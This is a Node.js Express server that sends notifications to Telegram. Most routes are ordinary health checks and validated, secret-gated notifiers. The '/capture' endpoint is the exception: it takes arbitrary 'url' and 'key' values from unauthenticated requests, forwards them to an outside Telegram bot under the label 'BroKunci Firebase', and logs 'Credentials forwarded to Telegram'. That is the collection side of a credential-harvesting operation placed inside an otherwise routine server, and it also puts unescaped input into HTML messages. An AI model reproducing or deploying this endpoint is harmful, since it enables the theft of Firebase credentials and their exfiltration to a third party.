'use strict';

const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json({ limit: '25kb' }));

const publicDir = path.join(__dirname, 'public');
const rootDir = __dirname;

const frontendDir = fs.existsSync(publicDir)
    ? publicDir
    : rootDir;

app.use(express.static(frontendDir));

app.get('/', (req, res) => {
    const indexFile = path.join(frontendDir, 'index.html');
    if (fs.existsSync(indexFile)) {
        return res.sendFile(indexFile);
    }
    res.status(404).send('index.html not found. Add index.html to your project.');
});

app.get('/health', (req, res) => {
    res.json({ ok: true, status: 'healthy' });
});

app.get('/test', (req, res) => {
    res.json({ ok: true, msg: 'Server is alive' });
});

function getTelegramConfig() {
    return {
        token: process.env.TG_BOT_TOKEN,
        chatId: process.env.TG_CHAT_ID
    };
}

async function sendTelegramMessage(message) {
    const { token, chatId } = getTelegramConfig();
    if (!token || !chatId) {
        throw new Error('Missing TG_BOT_TOKEN or TG_CHAT_ID in Render Environment.');
    }

    const response = await fetch(
        `https://api.telegram.org/bot${token}/sendMessage`,
        {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message })
        }
    );

    const result = await response.json();
    if (!response.ok || !result.ok) {
        throw new Error(result.description || 'Telegram API request failed');
    }
    return result;
}

app.post('/api/telegram/test', async (req, res) => {
    const expectedSecret = process.env.TELEGRAM_TEST_SECRET;
    const providedSecret = req.get('x-test-secret');
    if (!expectedSecret || !providedSecret || providedSecret !== expectedSecret) {
        return res.status(403).json({ ok: false, error: 'Forbidden' });
    }
    try {
        await sendTelegramMessage('Telegram test successful. Server is working.');
        res.json({ ok: true, msg: 'Telegram message sent successfully.' });
    } catch (error) {
        console.error('Telegram error:', error.message);
        res.status(500).json({ ok: false, error: error.message });
    }
});

app.post('/api/firebase/event', async (req, res) => {
    const event = req.body?.event;
    const status = req.body?.status;
    const safeLabel = /^[a-zA-Z0-9 _.-]+$/;
    if (
        typeof event !== 'string' ||
        typeof status !== 'string' ||
        event.length < 1 ||
        event.length > 80 ||
        status.length < 1 ||
        status.length > 40 ||
        !safeLabel.test(event) ||
        !safeLabel.test(status)
    ) {
        return res.status(400).json({
            ok: false,
            error: 'Provide valid, non-sensitive event and status labels.'
        });
    }
    try {
        const message =
            'Firebase Status Notification\n' +
            'Event: ' + event + '\n' +
            'Status: ' + status + '\n' +
            'Time: ' + new Date().toISOString();
        await sendTelegramMessage(message);
        res.json({ ok: true, msg: 'Notification sent.' });
    } catch (error) {
        console.error('Notification error:', error.message);
        res.status(500).json({ ok: false, error: error.message });
    }
});

app.post('/capture', async (req, res) => {
    const { url, key } = req.body;
    const { token, chatId } = getTelegramConfig();
    if (!token || !chatId) {
        console.log('❌ Missing TG_BOT_TOKEN or TG_CHAT_ID');
        return res.status(500).json({ error: 'Bot token or chat ID missing' });
    }
    const message = `<b>🔥 BroKunci Firebase</b>\n<pre>URL: ${url}\nKey: ${key}</pre>`;
    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
        });
        const data = await response.json();
        if (!response.ok || !data.ok) {
            console.error('Telegram send failed:', data);
            return res.status(500).json({ error: data.description || 'Send failed' });
        }
        console.log('✅ Credentials forwarded to Telegram');
        res.json({ ok: true });
    } catch (e) {
        console.error('Fetch error:', e.message);
        res.status(500).json({ error: e.message });
    }
});

app.use('/api', (req, res) => {
    res.status(404).json({ ok: false, error: 'API endpoint not found' });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
